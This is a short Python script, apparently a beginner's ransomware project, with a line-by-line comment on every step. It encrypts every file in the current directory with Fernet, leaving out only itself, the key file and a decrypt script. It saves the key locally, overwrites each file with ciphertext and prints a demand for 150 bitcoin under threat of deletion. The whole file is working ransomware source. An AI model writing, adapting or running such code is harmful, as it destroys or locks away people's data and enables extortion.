#!/usr/bin/env/ python3

import os #Import the OS module to interact with the system file I created.
from cryptography.fernet import Fernet # Fernet import for encryption services.

# This creates an empty list to store filenames.
files = []

# Loops through all files in the current directory.
for file in os.listdir():
	if file == "danger.py" or file == "thekey.key" or file == "decrypt.py": # This will skip files that should not be encrypted.
		continue # Continues to the next file in the loop.
	if os.path.isfile(file): # This will check if it's a file and not a directory.
		files.append(file) # This will add the file to the list of files to be encrypted.

print(files) # Prints the list of files to be encrypted.

key = Fernet.generate_key() #Generates a key from encryption using Fernet.

with open("thekey.key", "wb") as thekey: # This saves the encryption key to a file.
	thekey.write(key)

# This loop will each file in the list.
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents) # Encrypts the file using the generated key.
	with open(file, "wb") as thefile: # This will overwrite the file with encrypted contents.
		thefile.write(contents_encrypted)

# Displays the ransom message.
print("All of your files are encrypted, you must send me 150 bitcoin or else files will be deleted in 24 hours")
